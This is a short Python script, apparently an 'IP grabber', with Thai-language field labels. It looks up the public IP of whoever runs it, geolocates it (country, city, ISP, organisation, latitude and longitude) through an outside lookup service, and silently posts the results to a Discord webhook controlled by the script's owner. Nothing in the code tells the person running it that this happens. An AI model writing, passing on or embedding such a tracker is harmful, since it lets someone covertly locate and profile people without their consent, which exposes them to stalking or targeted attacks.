import requests
import json
from dhooks import Webhook, Embed
from datetime import datetime

hook = Webhook("webhook-url-here")

time = datetime.now().strftime("%H:%M %p")
ip = requests.get('https://api.ipify.org/').text

r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
geo = r.json()
embed = Embed()
fields = [
    {'name': 'IP', 'value': geo['query']},
    {'name': 'ประเภทของ IP', 'value': geo['ipType']},
    {'name': 'ประเทศ', 'value': geo['country']},
    {'name': 'เมือง', 'value': geo['city']},
    {'name': 'ทวีป', 'value': geo['continent']},
    {'name': 'ประเทศ', 'value': geo['country']},
    {'name': 'ชื่อ IP', 'value': geo['ipName']},
    {'name': 'ISP', 'value': geo['isp']},
    {'name': 'Latitute', 'value': geo['lat']},
    {'name': 'Longitude', 'value': geo['lon']},
    {'name': 'Org', 'value': geo['org']},
    {'name': 'พื้นที่', 'value': geo['region']},
    {'name': 'สถานะ', 'value': geo['status']},
]
for field in fields:
    if field['value']:
        embed.add_field(name=field['name'], value=field['value'], inline=True)
hook.send(embed=embed)
